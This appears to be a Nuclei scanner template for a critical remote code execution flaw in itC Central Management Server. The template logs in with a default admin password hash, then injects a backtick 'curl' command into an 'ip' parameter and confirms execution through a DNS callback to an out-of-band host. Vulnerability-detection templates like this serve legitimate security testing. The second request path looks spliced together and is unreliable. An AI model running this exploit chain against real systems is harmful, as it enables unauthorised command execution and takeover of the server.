id: itc-central-management-server-rce
info:
  name: itC Central Management Server Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,dnslog

variables:
  reverse_dns: "{{interactsh-url}}"

flow: http(1) && http(2)

http:
  - id: initial-login
    method: POST
    path:
      - "{{BaseURL}}/frame/actionLogin.do"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: "account=admin&password=21232f297a57a5a743894a0e4a801fc3&language=zh_CN"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0"
    extractors:
      - type: regex
        name: session_cookie
        regex:
          - "JSESSIONID=(.*?);"
        group: 1
        internal: true

  - id: execute-command
    method: POST
    path:
      - "{{BaseURL}}/system/actionNetworkCmd.doctionLogin.do"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      Cookie: "JSESSIONID={{session_cookie}}"
    body: "type=0&ip=127.0.0.1`curl {{reverse_dns}}`&time=5&port="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "0"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
